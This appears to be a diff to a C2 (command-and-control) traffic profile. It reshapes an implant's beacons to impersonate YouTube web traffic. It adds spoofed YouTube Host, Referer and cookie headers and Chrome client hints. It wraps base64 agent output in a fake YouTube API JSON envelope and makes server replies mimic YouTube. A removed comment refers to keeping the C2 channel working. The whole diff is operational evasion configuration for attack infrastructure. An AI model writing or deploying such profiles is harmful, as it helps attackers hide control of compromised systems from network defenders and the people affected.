@@ -46,7 +46,6 @@ Sec-Ch-Ua-Model = "''"
 Sec-Ch-Ua-Bitness = "''"
 Sec-Ch-Ua-Wow64 = "?0"
 Accept-Language = [
-    "en-GB,en;q=0.9",
     "en-US,en;q=0.9",
     "de-AT,de;q=0.9,en;q=0.8"
 ]
@@ -57,7 +56,6 @@ Sec-Fetch-Site = "none"
 Sec-Fetch-Mode = "navigate"
 Sec-Fetch-User = "?1"
 Sec-Fetch-Dest = "document"
-# Accept-Encoding = "gzip, deflate, br"     # While this is in the normal request, it breaks the C2 communication, so its commented out
 Priority = "u=0, i"
 
 # Defines arbitrary headers that are added to the server's response
@@ -102,9 +100,18 @@ request-methods = "POST"
 [http-post.agent.headers]
 Host = "www.youtube.com"
 Referer = "https://www.youtube.com/watch?v=###########"
-Content-Type = "application/octet-stream" 
+Content-Type = "application/json" 
 Connection = "Keep-Alive"
 Cache-Control = "no-cache"
+Sec-Ch-Ua = "'Not.A/Brand';v='99', 'Chromium';v='136'"
+Sec-Ch-Ua-Mobile = "?0"
+Sec-Ch-Ua-Full-Version = "''"
+Sec-Ch-Ua-Arch = "''"
+Sec-Ch-Ua-Platform = "'Windows'"
+Sec-Ch-Ua-Platform-Version = "''"
+Sec-Ch-Ua-Model = "''"
+Sec-Ch-Ua-Bitness = "''"
+Sec-Ch-Ua-Wow64 = "?0"
 Cookie = "YSC=###########; SOCS=##############################################; VISITOR_PRIVACY_METADATA=##################################################################; __Secure-1PSIDTS=sidts-#######_##########################################_#########################; __Secure-3PSIDTS=sidts-#######_##########################################_#########################; HSID=####################;"               
 
 [http-post.agent.parameters]
@@ -115,6 +122,9 @@ pretty-print = [
 
 [http-post.agent.output]
 placement = { type = "body" }
+encoding = { type = "base64", url-safe = true }
+prefix = "{'context':{'client':{'hl':'de','gl':'AT','remoteHost':'$$.1$$.$$.1$$','deviceMake':'','deviceModel':'','visitorData':'Cgt1M016MzRrZmhTUSj12MbIBjInCgJBVBIhEh0SGwsMDg8QERITFBUWFxgZGhscHR4fICEiIyQlJiBe','userAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36,gzip(gfe)','clientName':'WEB','clientVersion':'2.20251107.01.00','osName':'Windows','osVersion':'10.0','originalUrl':'https://www.youtube.com/','screenPixelDensity':2,'platform':'DESKTOP','clientFormFactor':'UNKNOWN_FORM_FACTOR','configInfo':{'appInstallData':'"
+suffix = "'},'screenDensityFloat':1.5,'userInterfaceTheme':'USER_INTERFACE_THEME_DARK','timeZone':'Europe/Vienna','browserName':'Chrome','browserVersion':'142.0.0.0','acceptHeader':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','deviceExperimentId':'ChxOelUzTVRBeU1qQTJPVEV4TkRFNU5qUXhOQT09EPXYxsgGGPXYxsgG','rolloutToken':'CJu4u9qz64jjcxCr8dad-t-QAxjzyIbunueQAw%3D%3D','screenWidthPoints':1920,'screenHeightPoints':1065,'utcOffsetMinutes':60,'connectionType':'CONN_CELLULAR_3G','memoryTotalKbytes':'8000000','mainAppWebInfo':{'graftUrl':'https://www.youtube.com/watch?v=###########&list=RD4WIMyqBG9gs&start_radio=1','pwaInstallabilityStatus':'PWA_INSTALLABILITY_STATUS_UNKNOWN','webDisplayMode':'WEB_DISPLAY_MODE_BROWSER','isWebNativeShareAvailable':true}},'user':{'lockedSafetyMode':false},'request':{'useSsl':true,'internalExperimentFlags':[],'consistencyTokenJars':[]},'clickTracking':{'clickTrackingParams':'CJgFEKVBIhMIucGi957nkAMVneRJBx3cFhscygEErMFOaw=='},'adSignalsInfo':{'params':[{'key':'dt','value':'1762765953510'},{'key':'flash','value':'0'},{'key':'frm','value':'0'},{'key':'u_tz','value':'60'},{'key':'u_his','value':'4'},{'key':'u_h','value':'1200'},{'key':'u_w','value':'1920'},{'key':'u_ah','value':'1152'},{'key':'u_aw','value':'1920'},{'key':'u_cd','value':'24'},{'key':'bc','value':'31'},{'key':'bih','value':'1065'},{'key':'biw','value':'1905'},{'key':'brdim','value':'0,0,0,0,1920,0,1920,1152,1920,1065'},{'key':'vis','value':'1'},{'key':'wgl','value':'true'},{'key':'ca_type','value':'image'}],'bid':'ANyPxKqp2RGW0TLEXMjNbBRm6ZPDYteE8iHnYK0DaJMOiTEHrbqefZtn6qfK_MhA2-ZgnoosEwKaN8pi77jJRptRzz5Rsm-P_w'}},'target':{'videoId':'###########'},'params':'Cg0KCzRXSU15cUJHOWdzIAAyDAiJ2cbIBhCm6ueLAQ%3D%3D'}"
 
 [http-post.server.headers]
 Content-Type = "application/json; charset=utf-8"
@@ -128,4 +138,4 @@ Strict-Transport-Security = "max-age=31536000"
 Alt-Svc = "h3=':443'; ma=2592000,h3-29=':443'; ma=2592000"
 
 [http-post.server.output]
-body = ""
+body = "{'responseContext': {}}"
